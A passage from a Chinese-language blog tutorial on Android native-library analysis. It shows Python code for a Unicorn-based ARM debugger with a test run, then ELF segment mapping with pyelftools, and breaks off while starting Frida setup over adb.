class="string">&quot;R6&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R7: <span class="string">&quot;R7&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R8: <span class="string">&quot;R8&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R9: <span class="string">&quot;R9&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R10: <span class="string">&quot;R10&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R11: <span class="string">&quot;R11&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R12: <span class="string">&quot;R12&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R13: <span class="string">&quot;R13&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R14: <span class="string">&quot;R14&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R15: <span class="string">&quot;R15&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_PC: <span class="string">&quot;PC&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_SP: <span class="string">&quot;SP&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_LR: <span class="string">&quot;LR&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line">REG_TABLE = &#123;UC_ARCH_ARM: REG_ARM&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2int</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&quot;0X&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(s[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">advance_dump</span>(<span class="params">data, base</span>):</span><br><span class="line">    PY3K = sys.version_info &gt;= (<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    generator = hexdump.genchunks(data, <span class="number">16</span>)</span><br><span class="line">    retstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> addr, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(generator):</span><br><span class="line">        <span class="comment"># 00000000:</span></span><br><span class="line">        line = <span class="string">&#x27;%08X: &#x27;</span> % (base + addr * <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line">        dumpstr = hexdump.dump(d)</span><br><span class="line">        line += dumpstr[:<span class="number">8</span> * <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &gt; <span class="number">8</span>:  <span class="comment"># insert separator if needed</span></span><br><span class="line">            line += <span class="string">&#x27; &#x27;</span> + dumpstr[<span class="number">8</span> * <span class="number">3</span>:]</span><br><span class="line">        <span class="comment"># ................</span></span><br><span class="line">        <span class="comment"># calculate indentation, which may be different for the last line</span></span><br><span class="line">        pad = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt; <span class="number">16</span>:</span><br><span class="line">            pad += <span class="number">3</span> * (<span class="number">16</span> - <span class="built_in">len</span>(d))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt;= <span class="number">8</span>:</span><br><span class="line">            pad += <span class="number">1</span></span><br><span class="line">        line += <span class="string">&#x27; &#x27;</span> * pad</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> d:</span><br><span class="line">            <span class="comment"># printable ASCII range 0x20 to 0x7E</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> PY3K:</span><br><span class="line">                byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0x20</span> &lt;= byte &lt;= <span class="number">0x7E</span>:</span><br><span class="line">                line += <span class="built_in">chr</span>(byte)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line += <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        retstr += line + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_trace</span>(<span class="params">mu, address, size, self</span>):</span><br><span class="line"> </span><br><span class="line">    self._tracks.append(address)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self._is_step <span class="keyword">and</span> self._tmp_bpt == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> address <span class="keyword">not</span> <span class="keyword">in</span> self._list_bpt:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> self._tmp_bpt != address <span class="keyword">and</span> self._tmp_bpt != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> _dbg_trace_internal(mu, address, size, self)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_memory</span>(<span class="params">mu, access, address, length, value, self</span>):</span><br><span class="line">    pc = mu.reg_read(arm_const.UC_ARM_REG_PC)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;memory error: pc: %x access: %x address: %x length: %x value: %x&quot;</span> %</span><br><span class="line">                 (pc, access, address, length, value))</span><br><span class="line">    _dbg_trace_internal(mu, pc, <span class="number">4</span>, self)</span><br><span class="line">    mu.emu_stop()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_trace_internal</span>(<span class="params">mu, address, size, self</span>):</span><br><span class="line"> </span><br><span class="line">    self._is_step = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;======================= Registers =======================&quot;</span>)</span><br><span class="line">    self.dump_reg()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">    self.dump_asm(address, size * self.dis_count)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_command = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> raw_command == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_command = self._last_command</span><br><span class="line">        self._last_command = raw_command</span><br><span class="line">        command = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> raw_command.split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> c != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                command.append(c)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> command[<span class="number">0</span>] == <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;reg&#x27;</span>:<span class="comment"># set reg regname value</span></span><br><span class="line">                    self.write_reg(command[<span class="number">2</span>], str2int(command[<span class="number">3</span>]))</span><br><span class="line">                <span class="keyword">elif</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.add_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;step&#x27;</span>:</span><br><span class="line">                <span class="comment"># self._tmp_bpt = address + size</span></span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;n&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;next&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = address + size</span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;dump&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(command) &gt;= <span class="number">3</span>:</span><br><span class="line">                    nsize = str2int(command[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nsize = <span class="number">4</span> * <span class="number">16</span></span><br><span class="line">                self.dump_mem(str2int(command[<span class="number">1</span>]), nsize)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.list_bpt()</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.del_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>]==<span class="string">&#x27;stop&#x27;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_thumb</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_arm</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot; == recent ==&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">10</span>:-<span class="number">1</span>]:</span><br><span class="line">                    <span class="built_in">print</span> (self.sym_handler(i))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;Command Not Found!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnicornDebugger</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, mu, mode = UDBG_MODE_ALL</span>):</span><br><span class="line">        self._tracks = []</span><br><span class="line">        self._mu = mu</span><br><span class="line">        self._arch = mu._arch</span><br><span class="line">        self._mode = mu._mode</span><br><span class="line">        self._list_bpt = []</span><br><span class="line">        self._tmp_bpt = <span class="number">0</span></span><br><span class="line">        self._error = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._last_command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.dis_count = <span class="number">5</span></span><br><span class="line">        self._is_step = <span class="literal">False</span></span><br><span class="line">        self.sym_handler = self._default_sym_handler</span><br><span class="line">        self._capstone_arm = <span class="literal">None</span></span><br><span class="line">        self._capstone_thumb = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._arch != UC_ARCH_ARM:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._arch == UC_ARCH_ARM:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_ARM64:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM64</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_X86:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_X86</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._mode == UC_MODE_THUMB:</span><br><span class="line">            capstone_mode = cp.CS_MODE_THUMB</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_ARM:</span><br><span class="line">            capstone_mode = cp.CS_MODE_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_32:</span><br><span class="line">            capstone_mode = cp.CS_MODE_32</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_64:</span><br><span class="line">            capstone_mode = cp.CS_MODE_64</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;mode:%d is not supported! &quot;</span> % self._mode)</span><br><span class="line"> </span><br><span class="line">        self._capstone_thumb = cp.Cs(cp.CS_ARCH_ARM, cp.CS_MODE_THUMB)</span><br><span class="line">        self._capstone_arm = cp.Cs(cp.CS_ARCH_ARM, cp.CS_MODE_ARM)</span><br><span class="line"> </span><br><span class="line">        self._capstone = self._capstone_thumb</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> mode == UDBG_MODE_ALL:</span><br><span class="line">            mu.hook_add(UC_HOOK_CODE, _dbg_trace, self)</span><br><span class="line"> </span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_UNMAPPED, _dbg_memory, self)</span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_FETCH_PROT, _dbg_memory, self)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self._regs = REG_TABLE[self._arch]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_mem</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        data = self._mu.mem_read(addr, size)</span><br><span class="line">        <span class="built_in">print</span> (advance_dump(data, addr))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_asm</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        md = self._capstone</span><br><span class="line">        code = self._mu.mem_read(addr, size)</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ins <span class="keyword">in</span> md.disasm(code, addr):</span><br><span class="line">            <span class="keyword">if</span> count &gt;= self.dis_count:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:\t%s\t%s&quot;</span> % (self.sym_handler(ins.address), ins.mnemonic, ins.op_str))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_reg</span>(<span class="params">self</span>):</span><br><span class="line">        result_format = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            value = self._mu.reg_read(rid)</span><br><span class="line">            <span class="keyword">if</span> count &lt; <span class="number">4</span>:</span><br><span class="line">                result_format += rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count = <span class="number">1</span></span><br><span class="line">                result_format += <span class="string">&#x27;\n&#x27;</span> + rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (result_format)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">self, reg_name, value</span>):</span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            <span class="keyword">if</span> rname == reg_name:</span><br><span class="line">                self._mu.reg_write(rid, value)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[Debugger Error] Reg not found:%s &quot;</span> % reg_name)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_help</span>(<span class="params">self</span>):</span><br><span class="line">        help_info = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        # commands</span></span><br><span class="line"><span class="string">        # set reg &lt;regname&gt; &lt;value&gt;</span></span><br><span class="line"><span class="string">        # set bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # n[ext]</span></span><br><span class="line"><span class="string">        # s[etp]</span></span><br><span class="line"><span class="string">        # r[un]</span></span><br><span class="line"><span class="string">        # dump &lt;addr&gt; &lt;size&gt;</span></span><br><span class="line"><span class="string">        # list bpt</span></span><br><span class="line"><span class="string">        # del bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # stop</span></span><br><span class="line"><span class="string">        # a/t change arm/thumb</span></span><br><span class="line"><span class="string">        # f show ins flow</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (help_info)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_bpt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self._list_bpt)):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[%d] %s&quot;</span> % (idx, self.sym_handler(self._list_bpt[idx])))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_bpt</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self._list_bpt.append(addr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_bpt</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self._list_bpt.remove(addr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tracks</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">            <span class="comment">#print (self.sym_handler(i))</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self._tracks</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_default_sym_handler</span>(<span class="params">self, address</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(address)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_symbol_name_handler</span>(<span class="params">self, handler</span>):</span><br><span class="line">        self.sym_handler = handler</span><br></pre></td></tr></table></figure><p>将它放入Python库中，比如我放到了<code>C:\Users\v5le0n9\AppData\Local\Programs\Python\Python38\Lib\site-packages\unicorn</code>中，如果想要调用调试器直接在测试文件中导入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.UnicornDebugger <span class="keyword">import</span> *</span><br><span class="line">THUMB = <span class="string">b&quot;\x83\xb0\x83\xb0\x83\xb0&quot;</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate Thumb code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">        ADDRESS = <span class="number">0x10000</span></span><br><span class="line">        mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">0x10000</span>)</span><br><span class="line">        mu.mem_write(ADDRESS, THUMB)</span><br><span class="line"> </span><br><span class="line">        mu.reg_write(UC_ARM_REG_SP, <span class="number">0x1234</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R2, <span class="number">0x6789</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#debugger attach</span></span><br><span class="line">        udbg = UnicornDebugger(mu)</span><br><span class="line">        udbg.add_bpt(ADDRESS)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># emulate machine code in infinite time</span></span><br><span class="line">        mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(THUMB))</span><br><span class="line">        r0 = mu.reg_read(UC_ARM_REG_SP)</span><br><span class="line">        r1 = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; SP = 0x%x&quot;</span> % r0)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R1 = 0x%x&quot;</span> % r1)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_arm()</span><br></pre></td></tr></table></figure><p>在调试过程中，发现无名大佬写的调试器还是有些致命性的错误的，比如在执行n或s命令时，正常来说是执行一条汇编指令的，但这里执行了两条指令。而且指令执行完后SP的值并没有改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python unicorn_test.py</span><br><span class="line">Emulate Thumb code</span><br><span class="line">======================= Registers =======================</span><br><span class="line">R0=0x0  R1=0x0  R2=0x6789       R3=0x0</span><br><span class="line">R4=0x0  R5=0x0  R6=0x0  R7=0x0</span><br><span class="line">R8=0x0  R9=0x0  R10=0x0 R11=0x0</span><br><span class="line">R12=0x0 SP=0x1234       LR=0x0  PC=0x10000</span><br><span class="line">======================= Disassembly =====================</span><br><span class="line">0x10000:        sub     sp, #0xc</span><br><span class="line">0x10002:        sub     sp, #0xc</span><br><span class="line">0x10004:        sub     sp, #0xc</span><br><span class="line">0x10006:        movs    r0, r0</span><br><span class="line">0x10008:        movs    r0, r0</span><br><span class="line">0x1000a:        movs    r0, r0</span><br><span class="line">0x1000c:        movs    r0, r0</span><br><span class="line">0x1000e:        movs    r0, r0</span><br><span class="line">0x10010:        movs    r0, r0</span><br><span class="line">0x10012:        movs    r0, r0</span><br><span class="line">&gt;s</span><br><span class="line">======================= Registers =======================</span><br><span class="line">R0=0x0  R1=0x0  R2=0x6789       R3=0x0</span><br><span class="line">R4=0x0  R5=0x0  R6=0x0  R7=0x0</span><br><span class="line">R8=0x0  R9=0x0  R10=0x0 R11=0x0</span><br><span class="line">R12=0x0 SP=0x1234       LR=0x0  PC=0x10004</span><br><span class="line">======================= Disassembly =====================</span><br><span class="line">0x10004:        sub     sp, #0xc</span><br><span class="line">0x10006:        movs    r0, r0</span><br><span class="line">0x10008:        movs    r0, r0</span><br><span class="line">0x1000a:        movs    r0, r0</span><br><span class="line">0x1000c:        movs    r0, r0</span><br><span class="line">0x1000e:        movs    r0, r0</span><br><span class="line">0x10010:        movs    r0, r0</span><br><span class="line">0x10012:        movs    r0, r0</span><br><span class="line">0x10014:        movs    r0, r0</span><br><span class="line">0x10016:        movs    r0, r0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="2-3-Unicorn调用so之加载模块"><a href="#2-3-Unicorn调用so之加载模块" class="headerlink" title="2.3 Unicorn调用so之加载模块"></a>2.3 Unicorn调用so之加载模块</h2><p>Android是基于Linux开发的，Android Native原生库是ELF文件格式。Unicorn 并不能加载ELF文件，所以我们要自己将ELF文件加载到Unicorn虚拟机的内存中去。 加载ELF 文件是一个很复杂的过程，涉及到ELF文件解析、重定位、符号解析、依赖库加载等。 </p><p>Python 可以使用elftools库解析ELF 文件。elftools安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyelftools</span><br></pre></td></tr></table></figure><h3 id="2-3-1-映射ELF文件"><a href="#2-3-1-映射ELF文件" class="headerlink" title="2.3.1 映射ELF文件"></a>2.3.1 映射ELF文件</h3><p>ELF 文件有两种视图，链接视图和执行视图。elftools 是基于链接视图解析ELF格式的，然而现在有一些ELF文件的section信息是被抹掉的。</p><p>加载ELF文件第一步需要将ELF文件映射到内存。如何映射呢？只需要找到类型为PT_LOAD的segment，按照segment的信息映射即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - LOAD (determinate what parts of the ELF file get mapped into memory)</span></span><br><span class="line">load_segments = [x <span class="keyword">for</span> x <span class="keyword">in</span> elf.iter_segments() <span class="keyword">if</span> x.header.p_type == <span class="string">&#x27;PT_LOAD&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> segment <span class="keyword">in</span> load_segments:</span><br><span class="line">    prot = UC_PROT_ALL</span><br><span class="line">    self.emu.memory.mem_map(load_base + segment.header.p_vaddr, segment.header.p_memsz, prot)</span><br><span class="line">    self.emu.memory.mem_write(load_base + segment.header.p_vaddr, segment.data())</span><br></pre></td></tr></table></figure><h1 id="3-Frida"><a href="#3-Frida" class="headerlink" title="3. Frida"></a>3. Frida</h1><p>在Windows上安装好Frida-tools和Frida后，在安卓上安装Frida-server。</p><p>首先要准备好你的安卓机，真机、模拟器都可以，还需要<a href="https://blog.csdn.net/weixin_44903147/article/details/104065844">adb工具包</a>。使用adb查看和连接安卓设备，查看安卓设备的架构类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Downloads\platform-tools_r33.0.2-windows&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">192.168.24.101:5555     device</span><br><span class="line"></span><br><span class="line"></span><br><span 